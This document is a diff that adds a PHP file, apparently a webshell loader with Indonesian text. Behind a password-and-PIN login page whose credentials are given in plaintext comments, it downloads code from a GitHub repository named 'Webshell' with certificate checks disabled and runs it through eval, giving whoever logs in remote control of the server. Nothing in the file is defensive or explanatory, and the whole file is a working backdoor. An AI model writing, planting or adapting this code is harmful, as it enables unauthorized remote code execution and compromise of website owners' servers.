@@ -1,0 +1,92 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+session_start();
+define('SECURE_ACCESS', true);
+header('X-Powered-By: none');
+header('Content-Type: text/html; charset=UTF-8');
+
+$hashed_password = '$2y$10$hEw84o9ot68EKvS0WHTmqeNncTm0ijnShx5frgZskHfhofzOcDv2y'; // bcrypt dari 'rahasia123'
+$hashed_pin = '$2y$10$coRx0fTZHevyqlmcgACS6eEkr8gvSQw3E5x1i4TxEW3UfMltSPDx2'; // bcrypt dari '246810'
+
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        $data = curl_exec($conn);
+        curl_close($conn);
+        return $data;
+    } elseif (function_exists('file_get_contents')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+
+function is_logged_in() {
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+if (is_logged_in()) {
+    $a = geturlsinfo('https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/accretiaa.txt');
+    if ($a === false) {
+        die("Gagal mendapatkan konten dari URL.");
+    }
+    // Debug tampilkan dulu isi $a jika perlu
+    // echo "<pre>" . htmlspecialchars($a) . "</pre>"; exit;
+    eval('?>' . $a);
+} else {
+    $error = '';
+    if (isset($_POST['password']) && isset($_POST['pin'])) {
+        $entered_password = $_POST['password'];
+        $entered_pin = $_POST['pin'];
+
+        if (password_verify($entered_password, $hashed_password) && password_verify($entered_pin, $hashed_pin)) {
+            $_SESSION['logged_in'] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = "Password atau PIN salah!";
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Login</title>
+    <style>
+      html, body { margin: 0; height: 100vh; overflow: hidden; }
+      body { font-family: Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; perspective: 1000px; position: relative; }
+      #bgVideo { position: fixed; top: 50%; left: 50%; width: auto; height: 100vh; min-width: 100vw; min-height: 100vh; transform: translate(-50%, -50%); z-index: -1; object-fit: cover; filter: brightness(0.6); }
+      .container { width: 320px; padding: 40px; background: rgba(17,17,17, 0.75); border-radius: 15px; box-shadow: 0 0 30px #680202; color: white; text-align: center; }
+      input { width: 80%; padding: 10px; margin: 15px 0; border-radius: 8px; border: none; outline: none; font-size: 1rem; }
+      button { width: 84%; padding: 12px; background: #680202; border: none; border-radius: 12px; color: #111; font-weight: bold; cursor: pointer; transition: background 0.3s ease; }
+      button:hover { background: #680202; }
+      .error { color: red; margin-bottom: 20px; }
+    </style>
+    </head>
+    <body>
+      <video id="bgVideo" autoplay loop muted playsinline>
+        <source src="https://ukrim.org/img/asupandewasa.mp4" type="video/mp4" />
+        Your browser does not support the video tag.
+      </video>
+      <div class="container">
+        <h2>Login</h2>
+        <?php if (!empty($error)) echo "<div class='error'>$error</div>"; ?>
+        <form method="post">
+          <input type="password" name="password" placeholder="Masukan password" required />
+          <input type="password" name="pin" placeholder="Masukan PIN" maxlength="6" required />
+          <button type="submit">Login</button>
+        </form>
+      </div>
+    </body>
+    </html>
+    <?php
+}
+?>
